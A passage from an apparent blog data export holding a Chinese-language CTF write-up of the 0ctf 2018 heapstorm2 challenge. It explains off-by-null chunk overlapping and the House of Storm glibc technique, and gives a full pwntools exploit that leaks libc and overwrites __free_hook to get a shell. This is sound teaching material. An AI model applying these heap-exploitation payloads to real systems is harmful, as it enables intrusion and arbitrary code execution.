bin中\nfree(2)#将chunk7控制的chunk(0x4f0)放入unsorted bin\nadd(0x4e8)#2 由于unsorted bin先进先出的机制，因此0x4e0的chunk首先被考虑，由于大小不足，被放入large bin。0x4f0的chunk由于大小恰好被分配出来。\nfree(2)#把chunk7控制的chunk(0x4f0)释放，放入unsorted bin\n\n#至此，可以用chunk7控制一个unsorted bin chunk(0x4f0)，用chunk8控制一个large bin chunk(0x4e0)\n#并且unsorted bin chunk size >large bin chunk size ,并且均在一个large bin范围内\n\n#chunk7->unsorted bin chunk-0x10\n#chunk8->large bin chunk-0x20\n```\n\n之后就可以进行House of Storm了，需要构造一下内容：\n\n```c\nunsorted_bin_chunk->bk=fake_chunk\nlarge_bin_chunk->bk=fake_chunk+0x8\nlarge_bin_chunk->bk_nextsize=fake_chunk-0x18-5\n```\n\n这里的fake chunk自然就是0x13370800-0x10。\n\n```python\n#修改unsorted bin chunk的bk,large bin chunk的bk和bk_nextsize\nfake=0x13370800-0x10\npayload=p64(0)*2+p64(0)+p64(0x4f1)+p64(0)+p64(fake)\nedit(7,payload)#unsort bin chunk's bk\npayload=p64(0)*4+p64(0)+p64(0x4e1)+p64(0)+p64(fake+0x8)+p64(0)+p64(fake-0x18-0x5)\nedit(8,payload)#large bin chunk's bk and bk_nextsize\n\n#如果运气好，堆地址的高位是0x56，则能绕过检测malloc成功\nadd(0x48)#2 malloc 0x13370800 House of Storm\n```\n\n申请到0x13370800之后，就可以修改r3和r4获得show来leak libcbase，之后也可以修改r1、r2和堆指针获得任意写。\n\n因为malloc后才加密，而在malloc之后，仍会保存其fd和bk（不知道为什么没有被calloc清空），之后chunk_addr^fd再写入heaparray中。此时fd->unsorted bin，因此heaparray+0x40^chunk_addr可以得到fd，由此可以leak libcbase。\n\n```python\n#reset r1~r4 and leak libc\npayload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)#reset chunk0=>heaparray\nedit(2,payload)#get show\n\nshow(0)\n\nru(\"]: \")\nru('HEAPSTORM_II')\nlibcbase=(uu64(ru('\\x7f')[-6:])^0x13370800)-0x68-0x3c4b10\nleak('libcbase',hex(libcbase))\n```\n\n最后修改__free_hook为system函数，执行system(\"/bin/sh\\x00\")。\n\n总的exp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='./pwn'\nelf=ELF(filename)\nlibc=ELF('./libc-2.23.so')\np=process(filename)\n#p=remote()\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\ndef add(size):\n  ru('Command: ')\n  sl('1')\n  ru('Size: ')\n  sl(str(size))\n\ndef edit(idx,content):\n  ru('Command: ')\n  sl('2')\n  ru('Index: ')\n  sl(str(idx))\n  ru('Size: ')\n  sl(str(len(payload)))\n  ru('Content: ')\n  s(str(content))\n\ndef free(idx):\n  ru('Command: ')\n  sl('3')\n  ru('Index: ')\n  sl(str(idx))\n\ndef show(idx):\n  ru('Command: ')\n  sl('4')\n  ru('Index: ')\n  sl(str(idx))\n\nadd(0x18)#0\nadd(0x508)#1\nadd(0x18)#2\nadd(0x18)#3\nadd(0x508)#4\nadd(0x18)#5\nadd(0x18)#6\n\npayload='a'*0x4f0+p64(0x500)\nedit(1,payload)#edit the pre_size of fake chunk \nfree(1)#reset the pre_inuse and pre_size of chunk2\n#reset the size of chunk1 by null of byte\npayload='a'*(0x18-12)\nedit(0,payload)\n\n#malloc 0x500\nadd(0x18)#1\nadd(0x4d8)#7\n\nfree(1)\nfree(2)#the pre_size of chunk2 is 0x510 ,pre_inuse is 0 so chunk 2 will merge with chunk1(chunk2-pre_size==chunk1)\n#now we achieve chunk overlapping\n#chunk7->heap_base+0x50 can control 0x4d8\n#now we use malloc to get the chunk\nadd(0x38)#1\nadd(0x4e8)#2 can be control by chunk7(chunk7->chunk2-0x10)\n\n\n#do again by chunk4\npayload='a'*0x4f0+p64(0x500)\nedit(4,payload)#edit the pre_size of fake chunk \nfree(4)#reset the pre_inuse and pre_size of chunk2\npayload='a'*(0x18-12)\nedit(3,payload)\nadd(0x18)#4\nadd(0x4d8)#8\n#chunk8->heap_base+0x5a0 can control 0x4d8\nfree(4)\nfree(5)\n\nadd(0x48)#4 make a smaller chunk\nfree(2)\nadd(0x4e8)#2 put the smaller chunk into large bin(size=0x4e1) control by chunk8\nfree(2)#put the bigger chunk into unsorted bin(size=0x4f1) controlled by chunk7\n\n#reset the bk of unsorted bin chunk, bk and bk_nextsize of large bin chunk\nfake=0x13370800-0x10\npayload=p64(0)*2+p64(0)+p64(0x4f1)+p64(0)+p64(fake)\nedit(7,payload)#unsort bin chunk's bk\npayload=p64(0)*4+p64(0)+p64(0x4e1)+p64(0)+p64(fake+0x8)+p64(0)+p64(fake-0x18-0x5)\nedit(8,payload)#large bin chunk's bk and bk_nextsize\nadd(0x48)#2 malloc 0x13370800\n\n#reset r1~r4 and leak libc\npayload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)#reset chunk0=>heaparray\nedit(2,payload)#get show\n\nshow(0)\n\nru(\"]: \")\nru('HEAPSTORM_II')\nlibcbase=(uu64(ru('\\x7f')[-6:])^0x13370800)-0x68-0x3c4b10\nleak('libcbase',hex(libcbase))\n\n#overwrite free_hook to get shell\nfree_hook=libcbase+libc.sym['__free_hook']\nsys_addr=libcbase+libc.sym ['system']\nleak(\"free_hook\",hex(free_hook))\nleak(\"system\",hex(sys_addr))\n\npayload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)+p64(free_hook)+p64(0x50)+p64(0x13370850)+p64(0x50)+\"/bin/sh\\x00\"\n#reset chunk1=>free_hook chunk2=>\"/bin/sh\"\nedit(0,payload)\n#debug()\npayload=p64(sys_addr)\nedit(1,payload)\n\nfree(2)\n\nitr()\n```\n","source":"_posts/0ctf_2018_heapstorm2.md","raw":"---\ntitle: 0ctf_2018_heapstorm2\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n- house_of_xxx\n---\nHouse of Storm例题\n<!-- more -->\n64位堆题，保护全开，libc 2.23。\n\n一个菜单，有增删查改功能。\n\n程序开始时会禁用，初始化heap_array。\n\n```c\nstruct heapchunk\n{\n    unsigned long size ^ r1;\n    unsigned long chunk ^ r2;\n};\n\nstruct heaparray\n{\n    unsigned long r1,r2,r3,r4;//四个随机数，其中r3==r4\n    struct heapchunk heap_chunk[16];\n} heap_array;\n\n```\n\nadd功能中最多同时存在16个chunk并且会使用calloc，对chunk中内容清空。\n\ndelete功能中会检测idx和size是否正确，free后会清空指针和size。\n\nedit功能中存在off by one漏洞。写入数据大小必须**小于size-0x12**，并且会在写入的content后面加上一个12字节的字符串，同时会**多写一个'\\x00'**。因此这里直接利用edit控制pre_size是不可行的。\n\nshow功能开始的时候会对heaparray的r3和r4进行xor，只有结果`==0x13377331`才能show，然而``r3==r4`，xor的结果会是0。这让我们能够**控制heaparray才能show**。\n\n首先我们通过off by null减小size，再利用前向合并(unlink)来实现overlapping，控制两个chunk用于house of storm。\n\n```python\nadd(0x18)#0\nadd(0x508)#1\nadd(0x18)#2\n\nadd(0x18)#3\nadd(0x508)#4\nadd(0x18)#5\nadd(0x18)#6\n\n\npayload='a'*0x4f0+p64(0x500)\nedit(1,payload)#首先在chunk1+0x4f0写入0x500，作为之后的pre_size\nfree(1)#释放chunk1，这会写入chunk2的pre_size(0x510)和pre_inuse(0)\n\npayload='a'*(0x18-12)\nedit(0,payload)#通过off by null修改chunk1的size(0x511=>0x500)\n\n#这里将0x500的内容申请出来，chunk7后面用来overlapping\nadd(0x18)#1\nadd(0x4d8)#7\n\nfree(1)#绕过unlink的检查（合并的时候会用unlink去取chunk）\nfree(2)#释放chunk2后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk1的0x510)\n#由此实现overlapping，chunk7->heapbase+0x50，能写入0x4d8(实际上只要能控制前0x20即可)\n\nadd(0x38)#1\nadd(0x4e8)#2 overlapping，可以被chunk7控制，size为0x4f0\n\n#故技重施\npayload='a'*0x4f0+p64(0x500)\nedit(4,payload)#在chunk4+0x4f0写入0x500，作为之后的pre_size\nfree(4)#释放chunk4，这会写入chunk5的pre_size(0x510)和pre_inuse(0)\n\npayload='a'*(0x18-12)\nedit(3,payload)#通过off by null修改chunk4的size(0x511=>0x500)\n\n#这里将0x500的内容申请出来，chunk8后面用来overlapping\nadd(0x18)#4\nadd(0x4d8)#8 \n\nfree(4)#绕过unlink的检查（合并的时候会用unlink去取chunk）\nfree(5)#释放chunk5后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk4的0x510)\n#由此实现overlapping，chunk8->heapbase+0x5a0，能写入0x4d8\n\nadd(0x48)#4 从unsorted bin中切割，余下0x4e0大小的chunk(被chunk8控制)在unsorted bin中\nfree(2)#将chunk7控制的chunk(0x4f0)放入unsorted bin\nadd(0x4e8)#2 由于unsorted bin先进先出的机制，因此0x4e0的chunk首先被考虑，由于大小不足，被放入large bin。0x4f0的chunk由于大小恰好被分配出来。\nfree(2)#把chunk7控制的chunk(0x4f0)释放，放入unsorted bin\n\n#至此，可以用chunk7控制一个unsorted bin chunk(0x4f0)，用chunk8控制一个large bin chunk(0x4e0)\n#并且unsorted bin chunk size >large bin chunk size ,并且均在一个large bin范围内\n\n#chunk7->unsorted bin chunk-0x10\n#chunk8->large bin chunk-0x20\n```\n\n之后就可以进行House of Storm了，需要构造一下内容：\n\n```c\nunsorted_bin_chunk->bk=fake_chunk\nlarge_bin_chunk->bk=fake_chunk+0x8\nlarge_bin_chunk->bk_nextsize=fake_chunk-0x18-5\n```\n\n这里的fake chunk自然就是0x13370800-0x10。\n\n```python\n#修改unsorted bin chunk的bk,large bin chunk的bk和bk_nextsize\nfake=0x13370800-0x10\npayload=p64(0)*2+p64(0)+p64(0x4f1)+p64(0)+p64(fake)\nedit(7,payload)#unsort bin chunk's bk\npayload=p64(0)*4+p64(0)+p64(0x4e1)+p64(0)+p64(fake+0x8)+p64(0)+p64(fake-0x18-0x5)\nedit(8,payload)#large bin chunk's bk and bk_nextsize\n\n#如果运气好，堆地址的高位是0x56，则能绕过检测malloc成功\nadd(0x48)#2 malloc 0x13370800 House of Storm\n```\n\n申请到0x13370800之后，就可以修改r3和r4获得show来leak libcbase，之后也可以修改r1、r2和堆指针获得任意写。\n\n因为malloc后才加密，而在malloc之后，仍会保存其fd和bk（不知道为什么没有被calloc清空），之后chunk_addr^fd再写入heaparray中。此时fd->unsorted bin，因此heaparray+0x40^chunk_addr可以得到fd，由此可以leak libcbase。\n\n```python\n#reset r1~r4 and leak libc\npayload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)#reset chunk0=>heaparray\nedit(2,payload)#get show\n\nshow(0)\n\nru(\"]: \")\nru('HEAPSTORM_II')\nlibcbase=(uu64(ru('\\x7f')[-6:])^0x13370800)-0x68-0x3c4b10\nleak('libcbase',hex(libcbase))\n```\n\n最后修改__free_hook为system函数，执行system(\"/bin/sh\\x00\")。\n\n总的exp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='./pwn'\nelf=ELF(filename)\nlibc=ELF('./libc-2.23.so')\np=process(filename)\n#p=remote()\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\ndef add(size):\n  ru('Command: ')\n  sl('1')\n  ru('Size: ')\n  sl(str(size))\n\ndef edit(idx,content):\n  ru('Command: ')\n  sl('2')\n  ru('Index: ')\n  sl(str(idx))\n  ru('Size: ')\n  sl(str(len(payload)))\n  ru('Content: ')\n  s(str(content))\n\ndef free(idx):\n  ru('Command: ')\n  sl('3')\n  ru('Index: ')\n  sl(str(idx))\n\ndef show(idx):\n  ru('Command: ')\n  sl('4')\n  ru('Index: ')\n  sl(str(idx))\n\nadd(0x18)#0\nadd(0x508)#1\nadd(0x18)#2\nadd(0x18)#3\nadd(0x508)#4\nadd(0x18)#5\nadd(0x18)#6\n\npayload='a'*0x4f0+p64(0x500)\nedit(1,payload)#edit the pre_size of fake chunk \nfree(1)#reset the pre_inuse and pre_size of chunk2\n#reset the size of chunk1 by null of byte\npayload='a'*(0x18-12)\nedit(0,payload)\n\n#malloc 0x500\nadd(0x18)#1\nadd(0x4d8)#7\n\nfree(1)\nfree(2)#the pre_size of chunk2 is 0x510 ,pre_inuse is 0 so chunk 2 will merge with chunk1(chunk2-pre_size==chunk1)\n#now we achieve chunk overlapping\n#chunk7->heap_base+0x50 can control 0x4d8\n#now we use malloc to get the chunk\nadd(0x38)#1\nadd(0x4e8)#2 can be control by chunk7(chunk7->chunk2-0x10)\n\n\n#do again by chunk4\npayload='a'*0x4f0+p64(0x500)\nedit(4,payload)#edit the pre_size of fake chunk \nfree(4)#reset the pre_inuse and pre_size of chunk2\npayload='a'*(0x18-12)\nedit(3,payload)\nadd(0x18)#4\nadd(0x4d8)#8\n#chunk8->heap_base+0x5a0 can control 0x4d8\nfree(4)\nfree(5)\n\nadd(0x48)#4 make a smaller chunk\nfree(2)\nadd(0x4e8)#2 put the smaller chunk into large bin(size=0x4e1) control by chunk8\nfree(2)#put the bigger chunk into unsorted bin(size=0x4f1) controlled by chunk7\n\n#reset the bk of unsorted bin chunk, bk and bk_nextsize of large bin chunk\nfake=0x13370800-0x10\npayload=p64(0)*2+p64(0)+p64(0x4f1)+p64(0)+p64(fake)\nedit(7,payload)#unsort bin chunk's bk\npayload=p64(0)*4+p64(0)+p64(0x4e1)+p64(0)+p64(fake+0x8)+p64(0)+p64(fake-0x18-0x5)\nedit(8,payload)#large bin chunk's bk and bk_nextsize\nadd(0x48)#2 malloc 0x13370800\n\n#reset r1~r4 and leak libc\npayload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)#reset chunk0=>heaparray\nedit(2,payload)#get show\n\nshow(0)\n\nru(\"]: \")\nru('HEAPSTORM_II')\nlibcbase=(uu64(ru('\\x7f')[-6:])^0x13370800)-0x68-0x3c4b10\nleak('libcbase',hex(libcbase))\n\n#overwrite free_hook to get shell\nfree_hook=libcbase+libc.sym['__free_hook']\nsys_addr=libcbase+libc.sym ['system']\nleak(\"free_hook\",hex(free_hook))\nleak(\"system\",hex(sys_addr))\n\npayload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)+p64(free_hook)+p64(0x50)+p64(0x13370850)+p64(0x50)+\"/bin/sh\\x00\"\n#reset chunk1=>free_hook chunk2=>\"/bin/sh\"\nedit(0,payload)\n#debug()\npayload=p64(sys_addr)\nedit(1,payload)\n\nfree(2)\n\nitr()\n```\n","slug":"0ctf_2018_heapstorm2","published":1,"updated":"2023-03-26T09:39:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaes00035oudflls9zsk","content":"<p>House of Storm例题</p>\n<span id=\"more\"></span>\n<p>64位堆题，保护全开，libc 2.23。</p>\n<p>一个菜单，有增删查改功能。</p>\n<p>程序开始时会禁用，初始化heap_array。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">heapchunk</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> size ^ r1;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> chunk ^ r2;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">heaparray</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> r1,r2,r3,r4;<span class=\"comment\">//四个随机数，其中r3==r4</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">heapchunk</span> <span class=\"title\">heap_chunk</span>[16];</span></span><br><span class=\"line\">&#125; heap_array;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>add功能中最多同时存在16个chunk并且会使用calloc，对chunk中内容清空。</p>\n<p>delete功能中会检测idx和size是否正确，free后会清空指针和size。</p>\n<p>edit功能中存在off by one漏洞。写入数据大小必须<strong>小于size-0x12</strong>，并且会在写入的content后面加上一个12字节的字符串，同时会**多写一个’\\x00’**。因此这里直接利用edit控制pre_size是不可行的。</p>\n<p>show功能开始的时候会对heaparray的r3和r4进行xor，只有结果<code>==0x13377331</code>才能show，然而``r3==r4`，xor的结果会是0。这让我们能够<strong>控制heaparray才能show</strong>。</p>\n<p>首先我们通过off by null减小size，再利用前向合并(unlink)来实现overlapping，控制两个chunk用于house of storm。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x508</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x508</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x4f0</span>+p64(<span class=\"number\">0x500</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)<span class=\"comment\">#首先在chunk1+0x4f0写入0x500，作为之后的pre_size</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#释放chunk1，这会写入chunk2的pre_size(0x510)和pre_inuse(0)</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x18</span>-<span class=\"number\">12</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)<span class=\"comment\">#通过off by null修改chunk1的size(0x511=&gt;0x500)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#这里将0x500的内容申请出来，chunk7后面用来overlapping</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x4d8</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#绕过unlink的检查（合并的时候会用unlink去取chunk）</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#释放chunk2后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk1的0x510)</span></span><br><span class=\"line\"><span class=\"comment\">#由此实现overlapping，chunk7-&gt;heapbase+0x50，能写入0x4d8(实际上只要能控制前0x20即可)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x4e8</span>)<span class=\"comment\">#2 overlapping，可以被chunk7控制，size为0x4f0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#故技重施</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x4f0</span>+p64(<span class=\"number\">0x500</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,payload)<span class=\"comment\">#在chunk4+0x4f0写入0x500，作为之后的pre_size</span></span><br><span class=\"line\">free(<span class=\"number\">4</span>)<span class=\"comment\">#释放chunk4，这会写入chunk5的pre_size(0x510)和pre_inuse(0)</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x18</span>-<span class=\"number\">12</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)<span class=\"comment\">#通过off by null修改chunk4的size(0x511=&gt;0x500)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#这里将0x500的内容申请出来，chunk8后面用来overlapping</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x4d8</span>)<span class=\"comment\">#8 </span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">4</span>)<span class=\"comment\">#绕过unlink的检查（合并的时候会用unlink去取chunk）</span></span><br><span class=\"line\">free(<span class=\"number\">5</span>)<span class=\"comment\">#释放chunk5后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk4的0x510)</span></span><br><span class=\"line\"><span class=\"comment\">#由此实现overlapping，chunk8-&gt;heapbase+0x5a0，能写入0x4d8</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>)<span class=\"comment\">#4 从unsorted bin中切割，余下0x4e0大小的chunk(被chunk8控制)在unsorted bin中</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#将chunk7控制的chunk(0x4f0)放入unsorted bin</span></span><br><span class=\"line\">add(<span class=\"number\">0x4e8</span>)<span class=\"comment\">#2 由于unsorted bin先进先出的机制，因此0x4e0的chunk首先被考虑，由于大小不足，被放入large bin。0x4f0的chunk由于大小恰好被分配出来。</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#把chunk7控制的chunk(0x4f0)释放，放入unsorted bin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#至此，可以用chunk7控制一个unsorted bin chunk(0x4f0)，用chunk8控制一个large bin chunk(0x4e0)</span></span><br><span class=\"line\"><span class=\"comment\">#并且unsorted bin chunk size &gt;large bin chunk size ,并且均在一个large bin范围内</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#chunk7-&gt;unsorted bin chunk-0x10</span></span><br><span class=\"line\"><span class=\"comment\">#chunk8-&gt;large bin chunk-0x20</span></span><br></pre></td></tr></table></figure>\n\n<p>之后就可以进行House of Storm了，需要构造一下内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsorted_bin_chunk-&gt;bk=fake_chunk</span><br><span class=\"line\">large_bin_chunk-&gt;bk=fake_chunk+<span class=\"number\">0x8</span></span><br><span class=\"line\">large_bin_chunk-&gt;bk_nextsize=fake_chunk<span class=\"number\">-0x18</span><span class=\"number\">-5</span></span><br></pre></td></tr></table></figure>\n\n<p>这里的fake chunk自然就是0x13370800-0x10。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#修改unsorted bin chunk的bk,large bin chunk的bk和bk_nextsize</span></span><br><span class=\"line\">fake=<span class=\"number\">0x13370800</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x4f1</span>)+p64(<span class=\"number\">0</span>)+p64(fake)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,payload)<span class=\"comment\">#unsort bin chunk&#x27;s bk</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x4e1</span>)+p64(<span class=\"number\">0</span>)+p64(fake+<span class=\"number\">0x8</span>)+p64(<span class=\"number\">0</span>)+p64(fake-<span class=\"number\">0x18</span>-<span class=\"number\">0x5</span>)</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,payload)<span class=\"comment\">#large bin chunk&#x27;s bk and bk_nextsize</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果运气好，堆地址的高位是0x56，则能绕过检测malloc成功</span></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>)<span class=\"comment\">#2 malloc 0x13370800 House of Storm</span></span><br></pre></td></tr></table></figure>\n\n<p>申请到0x13370800之后，就可以修改r3和r4获得show来leak libcbase，之后也可以修改r1、r2和堆指针获得任意写。</p>\n<p>因为malloc后才加密，而在malloc之后，仍会保存其fd和bk（不知道为什么没有被calloc清空），之后chunk_addr^fd再写入heaparray中。此时fd-&gt;unsorted bin，因此heaparray+0x40^chunk_addr可以得到fd，由此可以leak libcbase。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#reset r1~r4 and leak libc</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x13377331</span>)+p64(<span class=\"number\">0x13370800</span>)+p64(<span class=\"number\">0x70</span>)<span class=\"comment\">#reset chunk0=&gt;heaparray</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)<span class=\"comment\">#get show</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;]: &quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;HEAPSTORM_II&#x27;</span>)</span><br><span class=\"line\">libcbase=(uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:])^<span class=\"number\">0x13370800</span>)-<span class=\"number\">0x68</span>-<span class=\"number\">0x3c4b10</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>\n\n<p>最后修改__free_hook为system函数，执行system(“/bin/sh\\x00”)。</p>\n<p>总的exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 